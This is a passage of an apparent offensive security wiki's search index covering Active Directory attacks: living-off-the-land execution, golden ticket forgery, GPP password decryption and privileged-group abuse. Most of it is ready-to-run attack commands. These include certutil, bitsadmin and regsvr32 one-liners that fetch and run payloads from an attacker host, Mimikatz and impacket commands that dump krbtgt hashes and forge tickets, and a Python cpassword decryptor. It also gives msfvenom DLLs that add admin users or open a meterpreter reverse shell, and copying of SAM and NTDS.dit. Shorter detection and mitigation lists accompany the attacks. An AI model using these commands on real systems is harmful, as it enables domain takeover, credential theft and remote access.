Execution","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-built-in-tools","title":"Using Built-in Tools","text":"<pre><code># Using certutil to download and execute\ncertutil -urlcache -split -f http://attackerIP/payload.exe payload.exe &amp;&amp; payload.exe\n\n# Using bitsadmin to download and execute\nbitsadmin /transfer myjob /download /priority normal http://attackerIP/payload.exe C:\\temp\\payload.exe &amp;&amp; C:\\temp\\payload.exe\n\n# Using rundll32 to execute code\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c whoami\");\n\n# Using regsvr32 to execute scriptlet\nregsvr32 /s /n /u /i:http://attackerIP/payload.sct scrobj.dll\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#opsec-considerations_8","title":"OPSEC Considerations","text":"<ul> <li>Uses legitimate system tools</li> <li>May bypass application whitelisting</li> <li>Less likely to be detected by signature-based AV</li> <li>Still detectable by behavior analysis</li> <li>Some tools have known malicious usage patterns</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#detection","title":"Detection","text":"<ul> <li>Monitor for new service creation (Event ID 7045)</li> <li>Watch for scheduled task creation (Event ID 4698)</li> <li>Track process creation events (Event ID 4688)</li> <li>Monitor network connections to unusual ports</li> <li>Analyze command-line arguments for suspicious patterns</li> <li>Watch for file operations in administrative shares</li> <li>Monitor WMI and WinRM activity</li> <li>Track authentication events from unusual sources</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#mitigation","title":"Mitigation","text":"<ul> <li>Implement principle of least privilege</li> <li>Use Local Administrator Password Solution (LAPS)</li> <li>Disable unnecessary services (WinRM, WMI, DCOM)</li> <li>Implement application whitelisting</li> <li>Deploy endpoint detection and response (EDR) solutions</li> <li>Monitor and restrict administrative tools</li> <li>Implement network segmentation</li> <li>Use privileged access workstations (PAWs)</li> <li>Enable just-in-time (JIT) administration</li> <li>Implement credential guard and other protection mechanisms</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/golden_ticket/","title":"Golden ticket","text":"","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#technique","title":"Technique","text":"<p>A Golden Ticket attack involves forging a Kerberos Ticket Granting Ticket (TGT) using the KRBTGT account's NTLM hash or AES key. The KRBTGT account is a special account used by the Key Distribution Center (KDC) to encrypt and sign all Kerberos tickets within a domain.</p> <p>With a forged Golden Ticket, an attacker can impersonate any user in the domain, including domain administrators and other privileged accounts. This provides complete and persistent access to the Active Directory domain, allowing the attacker to authenticate to any service or system within the domain without valid credentials.</p>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#prerequisites","title":"Prerequisites","text":"<p>Access Level: The attacker must have already obtained the KRBTGT account's password hash, typically through methods like DCSync, domain controller compromise, or NTDS.dit extraction.</p> <p>Information Needed: - Domain SID (Security Identifier) - KRBTGT account NTLM hash or AES key - Domain name (FQDN)</p>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#considerations","title":"Considerations","text":"<p>Impact</p> <p>A Golden Ticket attack provides complete and persistent access to the Active Directory domain, allowing the attacker to: - Impersonate any user, including Domain Admins - Access any resource in the domain - Create backdoor accounts - Persist indefinitely (or until the KRBTGT password is reset twice)</p> <p>OPSEC</p> <ul> <li>Golden Tickets can be configured with extremely long validity periods (up to 10 years)</li> <li>Activity using Golden Tickets may bypass typical authentication logs</li> <li>Advanced monitoring solutions may detect unusual Kerberos TGT issuance or usage patterns</li> <li>The attack may generate unusual Kerberos traffic from non-domain controller systems</li> </ul>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#1-obtain-the-domain-sid","title":"1. Obtain the Domain SID","text":"","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#locally-from-a-domain-joined-windows-machine","title":"Locally (from a domain-joined Windows machine):","text":"<pre><code>(Get-ADDomain).DomainSID\n</code></pre> <p>or</p> <p><pre><code>whoami /user\n</code></pre> (Domain SID is the part before the last hyphen (RID))</p>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#remotely","title":"Remotely:","text":"<pre><code>nxc ldap &lt;target&gt; -u &lt;user&gt; -p &lt;pass&gt; --sid\n</code></pre>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#2-obtain-the-krbtgt-account-hash","title":"2. Obtain the KRBTGT Account Hash","text":"","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#locally-using-mimikatz","title":"Locally using Mimikatz:","text":"<pre><code>lsadump::lsa /inject /name:krbtgt\n</code></pre>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#remotely-using-netexec","title":"Remotely using NetExec:","text":"<pre><code>nxc smb &lt;dcip&gt; --local-auth -u '' -p '' --lsa --user krbtgt\nnxc smb &lt;dcip&gt; --local-auth -u '' -p '' --ntds --user krbtgt\n</code></pre>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#remotely-using-impacket","title":"Remotely using Impacket:","text":"<pre><code>impacket-secretsdump user:pass@10.0.0.35\n</code></pre>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#3-generate-and-use-the-golden-ticket","title":"3. Generate and Use the Golden Ticket","text":"","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#using-mimikatz","title":"Using Mimikatz:","text":"<pre><code># Generate and inject the ticket into current session\nkerberos::golden /User:Administrator /domain:domain.local /sid:&lt;SID&gt; /krbtgt:&lt;krbtgt hash&gt; /id:500 /ptt\n\n# Spawn a command shell with the ticket\nmisc::cmd\n</code></pre> <p>Now you can use PsExec or other tools to access any system in the domain: <pre><code>psexec.exe -accepteula \\\\hostname cmd.exe\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#using-impacket","title":"Using Impacket:","text":"<pre><code># Generate the ticket file\nimpacket-ticketer -nthash &lt;krbtgt_ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; &lt;user_name&gt;\n\n# Or with AES key\nimpacket-ticketer -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; &lt;user_name&gt;\n</code></pre> <p>Set the ticket environment variable: <pre><code>export KRB5CCNAME=&lt;TGS_ccache_file&gt;\n</code></pre></p> <p>Then access any system in the domain: <pre><code>impacket-psexec &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass\nimpacket-wmiexec &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass\nimpacket-smbexec &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Golden Tickets remain valid until the KRBTGT password is reset twice</li> <li>No direct cleanup is needed after using Golden Tickets</li> <li>The activity will leave traces in various logs depending on what actions were performed</li> </ul>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#detection","title":"Detection","text":"<ul> <li>Monitor for TGT requests that don't match expected encryption types</li> <li>Look for authentication from unusual source systems</li> <li>Check for tickets with abnormally long validity periods (default is 10 hours)</li> <li>Monitor for signs of forged PACs (Privilege Attribute Certificates)</li> <li>Watch for increased privileged activity from accounts that normally don't exhibit such behavior</li> </ul>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/golden_ticket/#mitigation","title":"Mitigation","text":"<ul> <li>Reset the KRBTGT account password twice (to invalidate all existing tickets)</li> <li>Implement regular password rotation for the KRBTGT account</li> <li>Monitor and strictly limit administrative access to domain controllers</li> <li>Implement advanced monitoring for Kerberos anomalies</li> <li>Use Protected Users security group for privileged accounts</li> <li>Implement time-based restrictions on privileged account usage</li> <li>Consider implementing a tiered administrative model</li> </ul>","tags":["#type/technique","#tactic/TA0004","#tactic/TA0003","#technique/T1558.001","#stage/privilege-escalation","#stage/persistence","#os/windows","#tool/mimikatz","#tool/impacket","#protocol/kerberos","#tool/netexec"]},{"location":"Active%20Directory/flat/gpp_password/","title":"Gpp password","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#technique","title":"Technique","text":"<p>Group Policy Preferences (GPP) Password extraction exploits a vulnerability (MS14-025) in the way Windows stores passwords in Group Policy Preference files. When administrators configure certain Group Policy settings that require passwords (such as creating local accounts, scheduled tasks, or mapped drives), these passwords are stored in XML files within the SYSVOL share, which is accessible to all authenticated domain users.</p> <p>Although the passwords in these files are \"encrypted\" using AES, Microsoft published the static AES key used for this encryption, making it trivial to decrypt these passwords once the XML files are obtained.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#prerequisites","title":"Prerequisites","text":"<p>Access Level:  - For remote enumeration: Any authenticated domain user access - For local enumeration: Local system access to a domain-joined computer with cached Group Policy files</p> <p>System State: The target domain must have Group Policy Preferences containing passwords created before the MS14-025 patch (May 2014) or created using pre-patch tools.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#identification-and-exploitation","title":"Identification and Exploitation","text":"<p>https://github.com/TheManticoreProject/FindGPPPasswords</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#remote-enumeration-with-impacket","title":"Remote Enumeration with Impacket","text":"<p>Check for GPP passwords without credentials (if null sessions are allowed): <pre><code>impacket-Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'\n</code></pre></p> <p>With credentials: <pre><code>impacket-Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#using-netexec","title":"Using NetExec","text":"<p>Check for GPP autologin credentials: <pre><code>nxc smb 172.16.5.5 -u 'user' -p 'pass' -M gpp_autologin\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#manual-enumeration","title":"Manual Enumeration","text":"<ol> <li> <p>Access the SYSVOL share: <pre><code># Mount the share\nmount -t cifs //domain-controller/SYSVOL /mnt/sysvol -o username=user,password=pass\n\n# Or access directly\nsmbclient //domain-controller/SYSVOL -U user%pass\n</code></pre></p> </li> <li> <p>Search for potential files containing passwords: <pre><code>find /mnt/sysvol -name \"*.xml\" | xargs grep -l \"cpassword\"\n</code></pre></p> </li> </ol> <p>Common files to check: - Groups.xml (Local group accounts) - Services.xml (Service accounts) - Scheduledtasks.xml (Scheduled tasks) - Datasources.xml (Data sources) - Printers.xml (Printer connections) - Drives.xml (Drive maps)</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#decrypting-the-password","title":"Decrypting the Password","text":"<p>Once you find a cpassword value in an XML file, you can decrypt it:</p> <p>Using gpp-decrypt: <pre><code>gpp-decrypt \"j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw\"\n</code></pre></p> <p>Using manual decryption in Python: <pre><code>from Crypto.Cipher import AES\nimport base64\nimport binascii\n\n# Static AES key published by Microsoft\nkey = binascii.unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')\ncpassword = \"j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw\"\n\n# Decrypt the password\ndef decrypt(cpassword):\n    # Add padding if needed\n    cpassword += \"=\" * ((4 - len(cpassword) % 4) % 4)\n\n    # Decode and decrypt\n    password = base64.b64decode(cpassword)\n\n    # Create AES object and decrypt\n    cipher = AES.new(key, AES.MODE_CBC, b'\\x00' * 16)\n    decrypted = cipher.decrypt(password)\n\n    # Remove PKCS7 padding\n    padding = decrypted[-1]\n    if padding &gt; 16:\n        return decrypted.decode('utf-16le')\n    return decrypted[:-padding].decode('utf-16le')\n\nprint(decrypt(cpassword))\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#cached-gpp-files-on-endpoints","title":"Cached GPP Files on Endpoints","text":"<p>Even if a GPP setting is deleted rather than properly unlinked, cached copies of the XML files may remain on endpoints that received the policy. Check these locations on local systems:</p> <pre><code>C:\\ProgramData\\Microsoft\\Group Policy\\History\nC:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Group Policy\\History\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#detection","title":"Detection","text":"<ul> <li>Scan the SYSVOL share for XML files containing the \"cpassword\" attribute</li> <li>Monitor access to SYSVOL shares, especially enumeration of XML files</li> <li>Look for tools commonly used to exploit this vulnerability (gpp-decrypt, PowerSploit)</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/gpp_password/#mitigation","title":"Mitigation","text":"<ol> <li>Remove existing password-based GPP settings:</li> <li>Identify all GPP XML files with cpassword attributes</li> <li>Delete these settings through Group Policy Management Console</li> <li> <p>Remove the XML files from SYSVOL manually if needed</p> </li> <li> <p>Ensure MS14-025 patch is applied to all domain controllers</p> </li> <li> <p>Use alternative approaches:</p> </li> <li>For local accounts: Use LAPS (Local Administrator Password Solution)</li> <li>For service accounts: Use managed service accounts</li> <li> <p>For scheduled tasks: Use task scheduler with proper security context</p> </li> <li> <p>Audit Group Policy Objects regularly for insecure settings</p> </li> <li> <p>Implement least privilege for domain user accounts to limit access to sensitive areas</p> </li> </ol>","tags":["#type/technique","#tactic/TA0006","#technique/T1552.006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/impacket","#tool/netexec","#protocol/smb"]},{"location":"Active%20Directory/flat/group_membership/","title":"Group membership","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#technique","title":"Technique","text":"<p>Many built-in and custom Active Directory groups have powerful privileges that can be leveraged for privilege escalation. This technique involves exploiting group membership to escalate privileges, often to domain administrator or equivalent. The specific methods vary by group but typically involve abusing legitimate functionalities or permissions granted to these groups.</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Membership in one of the targeted privileged groups</p> <p>System State: Active Directory environment</p> <p>Tools: PowerView, BloodHound, dnscmd, sc, msfvenom, impacket, other group-specific utilities</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#dnsadmins-group-abuse","title":"DnsAdmins Group Abuse","text":"<p>[!WARNING] This attack loads a DLL into the DNS service. This can cause the DNS service to crash if implemented incorrectly. Always test in a controlled environment.</p> <p>DnsAdmins group members can load arbitrary DLLs with SYSTEM privileges on the DNS server:</p> <ol> <li> <p>Create a malicious DLL with msfvenom: <pre><code>msfvenom -p windows/x64/exec CMD='net user hacker Password123! /add &amp;&amp; net localgroup administrators hacker /add' -f dll &gt; dns.dll\n</code></pre></p> </li> <li> <p>Host the DLL on an SMB share:</p> </li> </ol> <p>Windows: <pre><code># On the attacker machine\nNew-SmbShare -Name \"share\" -Path \"C:\\Tools\" -FullAccess Everyone\n</code></pre></p> <p>Linux: <pre><code># On the attacker machine\nmkdir /tmp/share\ncp dns.dll /tmp/share/\nimpacket-smbserver share /tmp/share -smb2support\n</code></pre></p> <ol> <li> <p>Configure the DNS server to load your DLL: <pre><code># From a DnsAdmins account\ndnscmd.exe /config /serverlevelplugindll \\\\ATTACKER\\share\\dns.dll\n\n# Or via WMI\n$dnsserver = Get-WmiObject -Namespace \"root\\microsoftdns\" -Class \"microsoftdns_server\" -ComputerName \"dc.domain.local\"\n$dnsserver.serverlevelplugindll = \"\\\\ATTACKER\\share\\dns.dll\"\n$dnsserver.Put()\n</code></pre></p> </li> <li> <p>Restart the DNS service: <pre><code># From Windows\nsc.exe \\\\dc.domain.local stop dns\nsc.exe \\\\dc.domain.local start dns\n\n# From Linux (using impacket)\nimpacket-wmiexec domain/user:password@dc.domain.local \"sc stop dns\"\nimpacket-wmiexec domain/user:password@dc.domain.local \"sc start dns\"\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#server-operators-group-abuse","title":"Server Operators Group Abuse","text":"<p>Server Operators can start/stop services and log on locally to domain controllers:</p> <p>Windows: <pre><code># Stop a service\nsc.exe \\\\dc.domain.local stop \"Service Name\"\n\n# Create and start a malicious service\nsc.exe \\\\dc.domain.local create HackSvc binpath= \"cmd.exe /c net user hacker Password123! /add &amp;&amp; net localgroup administrators hacker /add\"\nsc.exe \\\\dc.domain.local start HackSvc\n</code></pre></p> <p>Linux: <pre><code># Using impacket\nimpacket-wmiexec domain/serveroperator:password@dc.domain.local \"sc stop \\\"Service Name\\\"\"\n\n# Create and start a malicious service\nimpacket-wmiexec domain/serveroperator:password@dc.domain.local \"sc create HackSvc binpath= \\\"cmd.exe /c net user hacker Password123! /add &amp;&amp; net localgroup administrators hacker /add\\\"\"\nimpacket-wmiexec domain/serveroperator:password@dc.domain.local \"sc start HackSvc\"\n</code></pre></p> <p>Alternatively, replace service binaries while the service is stopped (requires write access to the binary location).</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#print-operators-group-abuse","title":"Print Operators Group Abuse","text":"<p>Print Operators can add printers and manage print queues, but crucially, they have the SeLoadDriverPrivilege privilege:</p> <ol> <li> <p>Create a malicious driver with msfvenom: <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f dll &gt; malicious_driver.dll\n</code></pre></p> </li> <li> <p>Load the driver using the SeLoadDriverPrivilege: <pre><code># Using Priv2Admin tool\n.\\Priv2Admin.exe SeLoadDriverPrivilege \"\\\\path\\to\\malicious\\driver\"\n</code></pre></p> </li> </ol> <p>Print Operators can also add printer drivers which can be exploited for DLL injection.</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#backup-operators-group-abuse","title":"Backup Operators Group Abuse","text":"<p>Backup Operators have the ability to read any file on the system, bypassing standard access controls:</p> <p>Windows: 1. Access sensitive files using volume shadow copies: <pre><code># Create a shadow copy\nvssadmin create shadow /for=C:\n\n# Access the SAM and SYSTEM hives\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Temp\\\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\\n\n# Extract credentials with mimikatz or similar tools\n</code></pre></p> <ol> <li>Alternatively, use the Diskshadow utility: <pre><code>diskshadow&gt; set context persistent nowriters\ndiskshadow&gt; add volume c: alias temp\ndiskshadow&gt; create\ndiskshadow&gt; expose %temp% z:\ndiskshadow&gt; exec \"cmd.exe\" /c copy z:\\Windows\\NTDS\\ntds.dit C:\\Temp\\\n</code></pre></li> </ol> <p>Linux: <pre><code># Using CrackMapExec to dump SAM once you have access to the files\n# Assuming you've transferred the files to your Linux machine\nsecretsdump.py -sam SAM -system SYSTEM LOCAL\n\n# Using secretsdump directly against a DC (if you have credentials)\nimpacket-secretsdump -just-dc domain/backupoperator:password@dc.domain.local\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#account-operators-group-abuse","title":"Account Operators Group Abuse","text":"<p>Account Operators can create and manage user accounts and groups but not in the Domain Admins or other protected groups:</p> <p>Windows: <pre><code># Create a new user\nNew-ADUser -Name \"HackerUser\" -AccountPassword (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force) -Enabled $true\n\n# Add to a group with useful permissions\nAdd-ADGroupMember -Identity \"ServerAdmins\" -Members \"HackerUser\"\n\n# Alternative using net commands\nnet user HackerUser Password123! /add /domain\nnet group \"ServerAdmins\" HackerUser /add /domain\n</code></pre></p> <p>Linux: <pre><code># Using impacket\nimpacket-adduser domain/accountoperator:password@dc.domain.local HackerUser Password123!\n\n# Using netexec\nnxc ldap dc.domain.local -u accountoperator -p password --add-user HackerUser --password Password123!\n\n# Add to a group\nnxc ldap dc.domain.local -u accountoperator -p password --add-groupmember \"ServerAdmins\" HackerUser\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#event-log-readers-group-abuse","title":"Event Log Readers Group Abuse","text":"<p>Event Log Readers can access event logs, which may contain sensitive information:</p> <p>Windows: <pre><code># Extract information from event logs\nGet-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Select-Object -First 10\n\n# Look for passwords in logs\nGet-WinEvent -LogName * | Select-Object LogName | Sort-Object LogName -Unique\nGet-WinEvent -LogName Application | Where-Object {$_.Message -like \"*password*\"}\n</code></pre></p> <p>Linux: <pre><code># Using Windows Remote Management\nevil-winrm -i dc.domain.local -u eventlogreader -p password -s /path/to/scripts\n\n# Within evil-winrm session\nPS&gt; Get-EventLog -LogName Security -Newest 10\nPS&gt; Get-WinEvent -LogName Application | Where-Object {$_.Message -match \"password\"}\n</code></pre></p> <p>This information can be used for credential hunting and lateral 